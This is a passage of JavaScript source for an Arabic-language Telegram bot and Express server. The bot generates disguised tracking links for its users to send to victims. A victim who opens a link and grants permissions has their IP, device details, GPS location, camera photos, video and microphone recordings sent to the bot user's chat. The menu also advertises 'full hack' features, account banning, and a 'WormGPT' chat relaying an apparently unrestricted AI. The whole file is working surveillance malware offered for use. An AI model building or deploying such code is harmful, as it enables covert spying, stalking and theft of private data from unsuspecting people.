          [Markup.button.callback("\u{1F4CD} \u0645\u0648\u0642\u0639", "location"), Markup.button.callback("\u{1F527} \u062A\u0642\u0631\u064A\u0631 \u0634\u0627\u0645\u0644", "all")],
          [Markup.button.callback("\u{1F608} \u0648\u0648\u0631\u0645 \u062C\u064A \u0628\u064A \u062A\u064A", "btn_wormgpt_start"), Markup.button.callback("\u{1F525} \u0627\u062E\u062A\u0631\u0627\u0642 \u0643\u0627\u0645\u0644", "btn_full_hack")],
          [Markup.button.callback("\u{1F7E2} \u0641\u0643 \u062D\u0638\u0631 \u0648\u0627\u062A\u0633\u0627\u0628", "btn_whatsapp"), Markup.button.callback("\u{1F602} \u0627\u0639\u0637\u0646\u064A \u0646\u0643\u062A\u0629", "btn_joke")],
          [Markup.button.callback("\u{1F4F8} \u062D\u0638\u0631 \u0625\u0646\u0633\u062A\u062C\u0631\u0627\u0645", "btn_instagram"), Markup.button.callback("\u{1F3B5} \u062D\u0638\u0631 \u062A\u064A\u0643 \u062A\u0648\u0643", "btn_tiktok")],
          [Markup.button.callback("\u{1F6B7} \u062A\u0628\u0646\u064A\u062F \u0628\u062B \u062A\u064A\u0643 \u062A\u0648\u0643", "btn_tiktok_ban"), Markup.button.callback("\u{1F4BB} \u0643\u064A\u0641 \u062A\u0635\u0628\u062D \u0647\u0627\u0643\u0631", "btn_hacker")]
        ];
        if (ctx.from.id === 7845383853) {
          baseKeyboard.push([Markup.button.callback("\u2699\uFE0F \u0644\u0648\u062D\u0629 \u0627\u0644\u062A\u062D\u0643\u0645", "btn_control_panel")]);
        }
        await ctx.editMessageText(
          `\u2728 *\u0623\u0647\u0644\u0627\u064B \u0628\u0643 \u0641\u064A \u0627\u0644\u0628\u0648\u062A!* \u2728

\u{1F4CC} *\u062A\u0639\u0644\u064A\u0645\u0627\u062A \u0627\u0644\u0627\u0633\u062A\u062E\u062F\u0627\u0645:*
1. \u0627\u062E\u062A\u0631 \u0646\u0648\u0639 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u0630\u064A \u062A\u0631\u064A\u062F \u0625\u0646\u0634\u0627\u0621\u0647 \u0645\u0646 \u0627\u0644\u0623\u0632\u0631\u0627\u0631 \u0628\u0627\u0644\u0623\u0633\u0641\u0644.
2. (\u0644\u0628\u0639\u0636 \u0627\u0644\u0645\u064A\u0632\u0627\u062A) \u0633\u064A\u064F\u0637\u0644\u0628 \u0645\u0646\u0643 \u0625\u062F\u062E\u0627\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u0645\u0637\u0644\u0648\u0628\u0629 \u0644\u0644\u062A\u0633\u062C\u064A\u0644.
3. \u0633\u064A\u0642\u0648\u0645 \u0627\u0644\u0628\u0648\u062A \u0628\u062A\u0648\u0644\u064A\u062F \u0631\u0627\u0628\u0637 \u0645\u062E\u0635\u0635 \u0633\u0631\u064A.
4. \u0642\u0645 \u0628\u0645\u0634\u0627\u0631\u0643\u0629 \u0647\u0630\u0627 \u0627\u0644\u0631\u0627\u0628\u0637.
5. \u0639\u0646\u062F\u0645\u0627 \u064A\u062A\u0645 \u0641\u062A\u062D \u0627\u0644\u0631\u0627\u0628\u0637 \u0648\u0625\u0639\u0637\u0627\u0621 \u0627\u0644\u0635\u0644\u0627\u062D\u064A\u0627\u062A\u060C \u0633\u064A\u062A\u0645 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A \u0625\u0644\u064A\u0643 \u0647\u0646\u0627 \u0645\u0628\u0627\u0634\u0631\u0629.`,
          {
            parse_mode: "Markdown",
            ...Markup.inlineKeyboard(baseKeyboard)
          }
        ).catch((err) => console.error("Back Reply Error:", err));
        await ctx.answerCbQuery().catch(() => {
        });
        return;
      }
      if (feature === "btn_action_add") {
        userPendingState.set(chatId, "ADD_BTN_NAME");
        await ctx.reply("\u0623\u0631\u0633\u0644 \u0627\u0644\u0622\u0646 \u0627\u0633\u0645 \u0627\u0644\u0632\u0631 (\u0645\u062B\u0627\u0644: \u0645\u0646\u0635\u0629 \u062A\u062F\u0627\u0648\u0644):").catch(() => {
        });
        await ctx.answerCbQuery().catch(() => {
        });
        return;
      }
      if (feature === "btn_action_manage") {
        const customBtns = getCustomButtons(7845383853);
        if (customBtns.length === 0) {
          await ctx.answerCbQuery("\u274C \u0644\u0627 \u064A\u0648\u062C\u062F \u0644\u062F\u064A\u0643 \u0623\u0632\u0631\u0627\u0631 \u0645\u062E\u0635\u0635\u0629 \u062D\u0627\u0644\u064A\u0627\u064B.", { show_alert: true }).catch(() => {
          });
          return;
        }
        let keyboard = [];
        for (const b of customBtns) {
          keyboard.push([
            Markup.button.callback(`\u{1F5D1}\uFE0F \u062D\u0630\u0641: ${b.name}`, `btn_del_${b.id}`),
            Markup.button.callback(`\u270F\uFE0F \u062A\u0639\u062F\u064A\u0644: ${b.name}`, `btn_edit_${b.id}`)
          ]);
        }
        keyboard.push([Markup.button.callback("\u{1F519} \u0631\u062C\u0648\u0639", "btn_control_panel")]);
        await ctx.editMessageText("\u2699\uFE0F *\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0623\u0632\u0631\u0627\u0631 \u0627\u0644\u062E\u0627\u0635\u0629 \u0628\u0643:*", {
          parse_mode: "Markdown",
          ...Markup.inlineKeyboard(keyboard)
        }).catch((err) => console.error("Manage Reply Error:", err));
        await ctx.answerCbQuery().catch(() => {
        });
        return;
      }
      if (feature.startsWith("btn_del_")) {
        const id = parseInt(feature.replace("btn_del_", ""));
        deleteCustomButton(id, chatId);
        await ctx.answerCbQuery("\u2705 \u062A\u0645 \u0627\u0644\u062D\u0630\u0641 \u0628\u0646\u062C\u0627\u062D.").catch(() => {
        });
        await ctx.deleteMessage().catch(() => {
        });
        return;
      }
      if (feature.startsWith("btn_edit_")) {
        const id = parseInt(feature.replace("btn_edit_", ""));
        const btn = getCustomButton(id, chatId);
        if (!btn) {
          await ctx.answerCbQuery("\u274C \u0627\u0644\u0632\u0631 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F.").catch(() => {
          });
          return;
        }
        userPendingState.set(chatId, `EDIT_BTN_${id}`);
        await ctx.reply(`\u0623\u0631\u0633\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u062C\u062F\u064A\u062F \u0644\u0632\u0631 (${btn.name}):`).catch(() => {
        });
        await ctx.answerCbQuery().catch(() => {
        });
        return;
      }
      if (feature === "btn_full_hack") {
        const botUsername = ctx.botInfo?.username || "HackerExosBot";
        const vipMsg = `\u26A0\uFE0F *\u062A\u0641\u0639\u064A\u0644 \u0645\u064A\u0632\u0629 \u0627\u0644\u0627\u062E\u062A\u0631\u0627\u0642 \u0627\u0644\u0643\u0627\u0645\u0644 (VIP)* \u26A0\uFE0F

\u064A\u062C\u0628 \u0639\u0644\u064A\u0643 \u062F\u0639\u0648\u0629 30 \u0634\u062E\u0635 \u0644\u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u0628\u0648\u062A \u0644\u062A\u0641\u0639\u064A\u0644 \u0647\u0630\u0647 \u0627\u0644\u0645\u064A\u0632\u0629 \u0645\u062C\u0627\u0646\u0627\u064B.

\u0627\u0646\u0633\u062E \u0647\u0630\u0627 \u0627\u0644\u0646\u0635 \u0648\u0634\u0627\u0631\u0643\u0647 \u0645\u0639 \u0623\u0635\u062F\u0642\u0627\u0626\u0643 \u0648\u0641\u064A \u0627\u0644\u062C\u0631\u0648\u0628\u0627\u062A:

\u{1F525} *\u0628\u0648\u062A \u0627\u062E\u062A\u0631\u0627\u0642 \u0648\u0633\u062D\u0628 \u062F\u0627\u062A\u0627 \u062E\u064A\u0627\u0644\u064A!* \u{1F525}
\u062C\u0631\u0628 \u0627\u0644\u0628\u0648\u062A \u0645\u0646 \u0647\u0646\u0627: https://t.me/${botUsername}?start=${chatId}

\u0639\u062F\u062F \u0627\u0644\u062F\u0639\u0648\u0627\u062A \u0627\u0644\u062D\u0627\u0644\u064A: 0/30`;
        await ctx.reply(vipMsg, { parse_mode: "Markdown" }).catch(() => {
        });
        await ctx.answerCbQuery().catch(() => {
        });
        return;
      }
      if (PROMPTS[feature]) {
        await ctx.editMessageText("\u23F3 \u062C\u0627\u0631\u064A \u0625\u0646\u0634\u0627\u0621 \u0627\u0644\u0631\u062F...").catch(() => {
        });
        const aiResponse = await askWormGPT(PROMPTS[feature]);
        const textToSend = aiResponse.length > 4e3 ? aiResponse.substring(0, 4e3) + "..." : aiResponse;
        await ctx.editMessageText(textToSend, { parse_mode: "Markdown" }).catch(async () => {
          await ctx.editMessageText(textToSend).catch(async () => {
            await ctx.reply(textToSend).catch(() => {
            });
          });
        });
        return;
      }
      const needsDuration = ["mic", "all"].includes(feature);
      if (needsDuration) {
        userPendingState.set(chatId, feature);
        await ctx.reply("\u0627\u0644\u0631\u062C\u0627\u0621 \u0625\u062F\u062E\u0627\u0644 \u0627\u0644\u0645\u062F\u0629 \u0627\u0644\u0645\u0637\u0644\u0648\u0628\u0629 \u0628\u0627\u0644\u062B\u0648\u0627\u0646\u064A (\u0623\u0631\u0642\u0627\u0645 \u0641\u0642\u0637, \u0645\u062B\u0627\u0644: 5):").catch(() => {
        });
        await ctx.answerCbQuery().catch(() => {
        });
        return;
      }
      const linkId = Math.floor(Math.random() * 9e9) + 1e9;
      saveLink(linkId.toString(), chatId, feature);
      const link = `${APP_URL}/track/${linkId}-${feature}`;
      const featureNames = {
        "info": "\u{1F4BB} \u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632",
        "location": "\u{1F4CD} \u0645\u0648\u0642\u0639 \u062C\u063A\u0631\u0627\u0641\u064A",
        "cameraF": "\u{1F4F8} \u0635\u0648\u0631\u0629 \u0623\u0645\u0627\u0645\u064A\u0629",
        "cameraB": "\u{1F4F8} \u0635\u0648\u0631\u0629 \u062E\u0644\u0641\u064A\u0629"
      };
      if (!featureNames[feature]) {
        featureNames[feature] = feature;
      }
      await ctx.editMessageText(
        `\u2705 \u062A\u0645 \u0625\u0646\u0634\u0627\u0621 \u0631\u0627\u0628\u0637 ${featureNames[feature]}:

${link}

\u0634\u0627\u0631\u0643 \u0627\u0644\u0631\u0627\u0628\u0637 \u0648\u0633\u0623\u0631\u0633\u0644 \u0644\u0643 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A \u0641\u0648\u0631\u0627\u064B!`,
        { parse_mode: "HTML" }
      ).catch(async () => {
        await ctx.reply(`\u2705 \u062A\u0645 \u0625\u0646\u0634\u0627\u0621 \u0631\u0627\u0628\u0637 ${featureNames[feature]}:

${link}

\u0634\u0627\u0631\u0643 \u0627\u0644\u0631\u0627\u0628\u0637 \u0648\u0633\u0623\u0631\u0633\u0644 \u0644\u0643 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A \u0641\u0648\u0631\u0627\u064B!`, { parse_mode: "HTML" }).catch(() => {
        });
      });
    } catch (error) {
      console.error("Unhandled error in callback_query:", error);
    }
  });
  bot.on("message", async (ctx) => {
    try {
      if (!ctx.message || !("text" in ctx.message)) return;
      const chatId = ctx.from.id;
      if (!userPendingState.has(chatId)) return;
      const stateInfo = userPendingState.get(chatId);
      const text = ctx.message.text.trim();
      if (stateInfo === "WORM_CHAT") {
        await ctx.sendChatAction("typing").catch(() => {
        });
        const aiResp = await askWormGPT(text);
        const textToSend = aiResp.length > 4e3 ? aiResp.substring(0, 4e3) + "..." : aiResp;
        await ctx.reply(textToSend, { parse_mode: "Markdown" }).catch(async () => {
          await ctx.reply(textToSend).catch(() => {
          });
        });
        return;
      }
      if (stateInfo === "ADD_BTN_NAME") {
        tempButtonData.set(chatId, { name: text });
        userPendingState.set(chatId, "ADD_BTN_URL");
        await ctx.reply("\u0623\u0631\u0633\u0644 \u0627\u0644\u0622\u0646 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u062E\u0627\u0635 \u0628\u0627\u0644\u0632\u0631 (\u064A\u062C\u0628 \u0623\u0646 \u064A\u0628\u062F\u0623 \u0628\u0640 https://):").catch(() => {
        });
        return;
      }
      if (stateInfo === "ADD_BTN_URL") {
        if (!text.startsWith("https://")) {
          await ctx.reply("\u274C \u0639\u0630\u0631\u0627\u064B\u060C \u064A\u062C\u0628 \u0623\u0646 \u064A\u0628\u062F\u0623 \u0627\u0644\u0631\u0627\u0628\u0637 \u0628\u0640 https:// . \u0623\u0631\u0633\u0644 \u0627\u0644\u0631\u0627\u0628\u0637 \u0645\u0631\u0629 \u0623\u062E\u0631\u0649:").catch(() => {
          });
          return;
        }
        const data = tempButtonData.get(chatId);
        if (data && data.name) {
          addCustomButton(chatId, data.name, text);
          userPendingState.delete(chatId);
          tempButtonData.delete(chatId);
          await ctx.reply(`\u2705 \u062A\u0645 \u0625\u0636\u0627\u0641\u0629 \u0632\u0631 (${data.name}) \u0628\u0646\u062C\u0627\u062D! \u0623\u0631\u0633\u0644 /start \u0644\u0631\u0624\u064A\u062A\u0647.`).catch(() => {
          });
        }
        return;
      }
      if (stateInfo.startsWith("EDIT_BTN_")) {
        if (!text.startsWith("https://")) {
          await ctx.reply("\u274C \u0639\u0630\u0631\u0627\u064B\u060C \u064A\u062C\u0628 \u0623\u0646 \u064A\u0628\u062F\u0623 \u0627\u0644\u0631\u0627\u0628\u0637 \u0628\u0640 https:// . \u0623\u0631\u0633\u0644 \u0627\u0644\u0631\u0627\u0628\u0637 \u0645\u0631\u0629 \u0623\u062E\u0631\u0649:").catch(() => {
          });
          return;
        }
        const id = parseInt(stateInfo.replace("EDIT_BTN_", ""));
        const btn = getCustomButton(id, chatId);
        if (btn) {
          updateCustomButton(id, chatId, btn.name, text);
          userPendingState.delete(chatId);
          await ctx.reply(`\u2705 \u062A\u0645 \u062A\u0639\u062F\u064A\u0644 \u0632\u0631 (${btn.name}) \u0628\u0646\u062C\u0627\u062D!`).catch(() => {
          });
        }
        return;
      }
      const duration = parseInt(text);
      if (isNaN(duration) || duration <= 0 || duration > 3600) {
        await ctx.reply("\u274C \u0627\u0644\u0631\u062C\u0627\u0621 \u0625\u062F\u062E\u0627\u0644 \u0631\u0642\u0645 \u0635\u062D\u064A\u062D \u0644\u0644\u0645\u062F\u0629 \u0628\u0627\u0644\u062B\u0648\u0627\u0646\u064A (\u0645\u062B\u0627\u0644: 5):").catch(() => {
        });
        return;
      }
      userPendingState.delete(chatId);
      const featureWithDuration = `${stateInfo}_${duration}`;
      const linkId = Math.floor(Math.random() * 9e9) + 1e9;
      saveLink(linkId.toString(), chatId, featureWithDuration);
      const link = `${APP_URL}/track/${linkId}-${featureWithDuration}`;
      const featureNames = {
        "mic": "\u{1F399}\uFE0F \u062A\u0633\u062C\u064A\u0644 \u0635\u0648\u062A",
        "videoF": "\u{1F3A5} \u0641\u064A\u062F\u064A\u0648 \u0623\u0645\u0627\u0645\u064A",
        "videoB": "\u{1F3A5} \u0641\u064A\u062F\u064A\u0648 \u062E\u0644\u0641\u064A",
        "all": "\u{1F527} \u062A\u0642\u0631\u064A\u0631 \u0634\u0627\u0645\u0644"
      };
      const fName = featureNames[stateInfo] || stateInfo;
      await ctx.reply(
        `\u2705 \u062A\u0645 \u0625\u0646\u0634\u0627\u0621 \u0631\u0627\u0628\u0637 ${fName} \u0644\u0645\u062F\u0629 ${duration} \u062B\u0648\u0627\u0646:

${link}

\u0634\u0627\u0631\u0643 \u0627\u0644\u0631\u0627\u0628\u0637 \u0648\u0633\u0623\u0631\u0633\u0644 \u0644\u0643 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A \u0641\u0648\u0631\u0627\u064B!`,
        { parse_mode: "HTML" }
      ).catch(() => {
      });
    } catch (err) {
      console.error("Unhandled error in message handler:", err);
    }
  });
  bot.launch().catch((err) => {
    console.error("Bot launch failed (is token correct?):", err);
  });
  console.log("Telegram bot created successfully.");
  process.once("SIGINT", () => bot?.stop("SIGINT"));
  process.once("SIGTERM", () => bot?.stop("SIGTERM"));
} else {
  console.log("No BOT_TOKEN provided, Telegram bot will not be started.");
}
async function processFeature(chatId, feature, data, visitorIp) {
  if (!bot) {
    console.error("Bot not configured.");
    return false;
  }
  const featureNames = {
    "ip": "\u{1F30D} IP",
    "info": "\u{1F4BB} \u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632",
    "location": "\u{1F4CD} \u0627\u0644\u0645\u0648\u0642\u0639 \u0627\u0644\u062C\u063A\u0631\u0627\u0641\u064A",
    "mic": "\u{1F399}\uFE0F \u062A\u0633\u062C\u064A\u0644 \u0635\u0648\u062A",
    "cameraF": "\u{1F4F8} \u0635\u0648\u0631\u0629 \u0623\u0645\u0627\u0645\u064A\u0629",
    "cameraB": "\u{1F4F8} \u0635\u0648\u0631\u0629 \u062E\u0644\u0641\u064A\u0629",
    "all": "\u{1F527} \u062A\u0642\u0631\u064A\u0631 \u0643\u0627\u0645\u0644"
  };
  try {
    const sendMedia = async (type, base64Data, duration) => {
      const buffer = Buffer.from(base64Data.split(",")[1] || base64Data, "base64");
      const ext = type === "voice" ? "ogg" : type === "video" ? "mp4" : "jpg";
      const mimeName = type === "voice" ? "audio" : type;
      const caption = duration ? `\u062A\u0645 \u0627\u0644\u062A\u0633\u062C\u064A\u0644 (${duration} \u062B\u0648\u0627\u0646).` : type === "photo" ? void 0 : "\u062A\u0645 \u0627\u0644\u062A\u0633\u062C\u064A\u0644.";
      try {
        if (type === "photo") {
          await bot.telegram.sendPhoto(chatId, { source: buffer, filename: `photo.${ext}` });
        } else if (type === "voice") {
          await bot.telegram.sendVoice(chatId, { source: buffer, filename: `voice.${ext}` }, { caption });
        } else if (type === "video") {
          await bot.telegram.sendVideo(chatId, { source: buffer, filename: `video.${ext}` }, { caption });
        }
      } catch (e) {
        if (type !== "photo" && e.message && (e.message.includes("FORBIDDEN") || e.message.includes("wrong file identifier") || e.message.includes("WRONG_FILE_IDENTIFIER"))) {
          try {
            const docExt = "webm";
            await bot.telegram.sendDocument(chatId, { source: buffer, filename: `${mimeName}.${docExt}` }, { caption: (caption || "") + " (\u0643\u0645\u0633\u062A\u0646\u062F)" });
          } catch (err2) {
            console.error(`Failed to send ${type} as document:`, err2);
          }
        } else {
          console.error(`Failed to send ${type}:`, e.message || e);
          await bot.telegram.sendMessage(chatId, `\u274C \u0641\u0634\u0644 \u0625\u0631\u0633\u0627\u0644 ${type}: ${e.message || "\u062E\u0637\u0623 \u063A\u064A\u0631 \u0645\u0639\u0631\u0648\u0641"}`);
        }
      }
    };
    if (feature === "info" || feature.startsWith("info") || feature === "all" || feature.startsWith("all")) {
      let msg = `${featureNames["info"] || "\u{1F4BB} \u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632"}
`;
      if (feature === "all" || feature.startsWith("all")) {
        msg = `${featureNames["all"] || "\u{1F527} \u062A\u0642\u0631\u064A\u0631 \u0643\u0627\u0645\u0644"}
`;
      }
      if (data.deviceInfo) {
        const di = data.deviceInfo;
        msg += `\u{1F4F1} \u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u062C\u0647\u0627\u0632:
`;
        msg += `- \u0627\u0644\u062F\u0648\u0644\u0629: ${di.country} \u{1F53B}
`;
        msg += `- \u0627\u0644\u0645\u062F\u064A\u0646\u0629: ${di.city} \u{1F3D9}\uFE0F
`;
        msg += `- \u0639\u0646\u0648\u0627\u0646 IP: ${di.ip} \u{1F30D}
`;
        msg += `- \u0634\u062D\u0646 \u0627\u0644\u0647\u0627\u062A\u0641: ${di.batteryLevel} \u{1F50B}
`;
        msg += `- \u0647\u0644 \u0627\u0644\u0647\u0627\u062A\u0641 \u064A\u0634\u062D\u0646\u061F: ${di.isCharging} \u26A1
`;
        msg += `- \u0627\u0644\u0634\u0628\u0643\u0629: ${di.networkType} \u{1F4F6} (\u0633\u0631\u0639\u0629: ${di.networkSpeed})
`;
        msg += `- \u0646\u0648\u0639 \u0627\u0644\u0627\u062A\u0635\u0627\u0644: ${di.connType} \u{1F4E1}
`;
        msg += `- \u0627\u0644\u0648\u0642\u062A: ${di.time} \u23F0
`;
        msg += `- \u0627\u0633\u0645 \u0627\u0644\u062C\u0647\u0627\u0632: ${di.deviceName} \u{1F5A5}\uFE0F
`;
        msg += `- \u0625\u0635\u062F\u0627\u0631 \u0627\u0644\u062C\u0647\u0627\u0632: ${di.deviceVersion} \u{1F4DC}
`;
        msg += `- \u0646\u0648\u0639 \u0627\u0644\u062C\u0647\u0627\u0632: ${di.deviceType} \u{1F4F1}
`;
        msg += `- \u0627\u0644\u0630\u0627\u0643\u0631\u0629 (RAM): ${di.ram} \u{1F9E0}
`;
        msg += `- \u0627\u0644\u0630\u0627\u0643\u0631\u0629 \u0627\u0644\u062F\u0627\u062E\u0644\u064A\u0629: ${di.internalMemory} \u{1F4BE}
`;
        msg += `- \u0639\u062F\u062F \u0627\u0644\u0623\u0646\u0648\u064A\u0629: ${di.cores} \u2699\uFE0F
`;
        msg += `- \u0644\u063A\u0629 \u0627\u0644\u0646\u0638\u0627\u0645: ${di.systemLanguage} \u{1F310}
`;
        msg += `- \u0627\u0633\u0645 \u0627\u0644\u0645\u062A\u0635\u0641\u062D: ${di.browserName} \u{1F310}
`;
        msg += `- \u0625\u0635\u062F\u0627\u0631 \u0627\u0644\u0645\u062A\u0635\u0641\u062D: ${(di.browserVersion || "").substring(0, 100)} \u{1F4CA}
`;
        msg += `- \u062F\u0642\u0629 \u0627\u0644\u0634\u0627\u0634\u0629: ${di.screenResolution} \u{1F4CF}
`;
        msg += `- \u0625\u0635\u062F\u0627\u0631 \u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u0634\u063A\u064A\u0644: ${di.osVersion} \u{1F5A5}\uFE0F
`;
        msg += `- \u0648\u0636\u0639 \u0627\u0644\u0634\u0627\u0634\u0629: ${di.screenOrientation} \u{1F504}
`;
        msg += `- \u0639\u0645\u0642 \u0627\u0644\u0623\u0644\u0648\u0627\u0646: ${di.colorDepth} \u{1F3A8}
`;
        msg += `- \u062A\u0627\u0631\u064A\u062E \u0622\u062E\u0631 \u062A\u062D\u062F\u064A\u062B \u0644\u0644\u0645\u062A\u0635\u0641\u062D: ${di.browserUpdateDate} \u{1F4C5}
`;
        msg += `- \u0628\u0631\u0648\u062A\u0648\u0643\u0648\u0644 \u0627\u0644\u0623\u0645\u0627\u0646 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645: ${di.protocol} \u{1F512}
`;
        msg += `- \u0646\u0637\u0627\u0642 \u0627\u0644\u062A\u0631\u062F\u062F \u0644\u0644\u0627\u062A\u0635\u0627\u0644: ${di.frequency} \u{1F4E1}
`;
        msg += `- \u0625\u0645\u0643\u0627\u0646\u064A\u0629 \u062A\u062D\u062F\u064A\u062F \u0627\u0644\u0645\u0648\u0642\u0639 \u0627\u0644\u062C\u063A\u0631\u0627\u0641\u064A: ${di.geolocationSupported} \u{1F30D}
`;
        msg += `- \u0627\u0644\u062F\u0639\u0645 \u0644\u062A\u0642\u0646\u064A\u0629 \u0627\u0644\u0628\u0644\u0648\u062A\u0648\u062B: ${di.bluetoothSupported} \u{1F535}
`;
        msg += `- \u062F\u0639\u0645 \u0627\u0644\u0625\u064A\u0645\u0627\u0621\u0627\u062A \u0627\u0644\u0644\u0645\u0633\u064A\u0629: ${di.touchSupported} \u270B
`;
      } else {
        msg += `\u{1F30D} IP: ${data.ip || visitorIp}
`;
      }
      await bot.telegram.sendMessage(chatId, msg);
      if (feature !== "all" && !feature.startsWith("all")) return true;
    }
    if (feature === "location" || feature === "all" || feature.startsWith("all")) {
      const lat = data.location?.lat || data.lat;
      const lon = data.location?.lon || data.lon;
      const accuracy = data.location?.accuracy || data.accuracy;
      if (feature === "location" || lat && lon) {
        let msg = `${featureNames["location"]}
`;
        msg += `\u{1F4CD} \u062E\u0637 \u0627\u0644\u0639\u0631\u0636: ${lat || "\u063A\u064A\u0631 \u0645\u0639\u0631\u0648\u0641"}
`;
        msg += `\u{1F4CD} \u062E\u0637 \u0627\u0644\u0637\u0648\u0644: ${lon || "\u063A\u064A\u0631 \u0645\u0639\u0631\u0648\u0641"}
`;
        msg += `\u{1F3AF} \u0627\u0644\u062F\u0642\u0629: ${accuracy || "\u063A\u064A\u0631 \u0645\u0639\u0631\u0648\u0641"} \u0645\u062A\u0631
`;
        if (lat && lon) {
          msg += `\u{1F5FA}\uFE0F \u0627\u0644\u062E\u0631\u064A\u0637\u0629: https://maps.google.com/?q=${lat},${lon}`;
        }
        await bot.telegram.sendMessage(chatId, msg);
      }
      if (feature === "location") return true;
    }
    if (feature === "mic" || feature.startsWith("mic") || feature === "all" || feature.startsWith("all")) {
      if (feature === "mic" || feature.startsWith("mic") || data.audio) {
        if (data.audio) {
          await sendMedia("voice", data.audio, data.recordedDuration);
        } else if (feature !== "all" && !feature.startsWith("all")) {
          await bot.telegram.sendMessage(chatId, `${featureNames["mic"] || "\u{1F399}\uFE0F \u062A\u0633\u062C\u064A\u0644 \u0635\u0648\u062A"}
\u274C \u0641\u0634\u0644 \u0627\u0644\u062A\u0633\u062C\u064A\u0644: ${data.error || "\u062E\u0637\u0623 \u063A\u064A\u0631 \u0645\u0639\u0631\u0648\u0641"}`);
        }
      }
      if (feature === "mic" || feature.startsWith("mic")) return true;
    }
    if (feature === "cameraF" || feature === "cameraB" || feature.startsWith("camera") || feature === "all" || feature.startsWith("all")) {
      if (feature === "cameraF" || feature === "cameraB" || feature.startsWith("camera") || data.photo) {
        if (data.photo) {
          await sendMedia("photo", data.photo);
        } else if (feature !== "all" && !feature.startsWith("all")) {
          const defaultText = feature.startsWith("cameraF") ? "\u{1F4F8} \u0635\u0648\u0631\u0629 \u0623\u0645\u0627\u0645\u064A\u0629" : "\u{1F4F8} \u0635\u0648\u0631\u0629 \u062E\u0644\u0641\u064A\u0629";
          await bot.telegram.sendMessage(chatId, `${featureNames[feature] || defaultText}
\u274C \u0641\u0634\u0644 \u0627\u0644\u062A\u0635\u0648\u064A\u0631: ${data.error || "\u062E\u0637\u0623 \u063A\u064A\u0631 \u0645\u0639\u0631\u0648\u0641"}`);
        }
      }
      if (feature === "cameraF" || feature === "cameraB" || feature.startsWith("camera")) return true;
    }
    if (feature === "all" || feature.startsWith("all")) {
      return true;
    }
    await bot.telegram.sendMessage(chatId, `\u{1F4E5} \u0627\u0633\u062A\u0644\u0627\u0645 \u0628\u064A\u0627\u0646\u0627\u062A
\u0627\u0644\u0645\u064A\u0632\u0629: ${feature}
IP: ${visitorIp}`);
    return true;
  } catch (error) {
    console.error("Failed to process feature", error);
    return false;
  }
}
app.get("/api/health", (req, res) => {
  res.json({ status: "ok" });
});
app.get("/api/link/:id", (req, res) => {
  const [linkIdStr] = req.params.id.split("-");
  const link = getLink(linkIdStr);
  if (!link) {
    return res.status(404).json({ error: "Link not found" });
  }
  let feature = link.feature;
  let duration = 3e3;
  if (feature.startsWith("mic_")) {
    const parts = feature.split("_");
    duration = parseInt(parts[1]) * 1e3;
    feature = "mic";
  } else if (feature.startsWith("cameraF_")) {
    feature = "cameraF";
  } else if (feature.startsWith("cameraB_")) {
    feature = "cameraB";
  } else if (feature.startsWith("all_")) {
    const parts = feature.split("_");
    duration = parseInt(parts[1]) * 1e3;
    feature = "all";
  }
  return res.json({ feature, duration });
});
app.post("/api/track", async (req, res) => {
  try {
    const { linkId, feature, data, duration } = req.body;
    let visitorIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    if (visitorIp && visitorIp.includes(",")) {
      visitorIp = visitorIp.split(",")[0].trim();
    }
    if (!linkId) {
      const chat_id = req.body.chat_id;
      if (chat_id) {
        await processFeature(parseInt(chat_id), feature || "info", { ...req.body.data, recordedDuration: duration }, visitorIp);
        return res.json({ success: true, message: "Legacy tracking success" });
      }
      return res.status(400).json({ success: false, error: "LinkId required" });
    }
    const [linkIdStr] = linkId.split("-");
    const linkData = getLink(linkIdStr);
    if (!linkData) {
      return res.status(404).json({ success: false, error: "Link not found" });
    }
    saveVisit(linkIdStr, visitorIp, linkData.feature, { ...data, recordedDuration: duration });
    if (bot) {
      const success = await processFeature(linkData.chat_id, linkData.feature, { ...data, recordedDuration: duration }, visitorIp);
      if (success) {
        return res.json({ success: true, message: "Sent to Telegram" });
      } else {
        return res.status(500).json({ success: false, error: "Failed to send to Telegram" });
      }
    } else {
      return res.json({ success: true, message: "Saved but bot is offline" });
    }
  } catch (error) {
    console.error("Track error", error);
    res.status(500).json({ success: false, error: error.message });
  }
});
async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa"
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}
startServer();
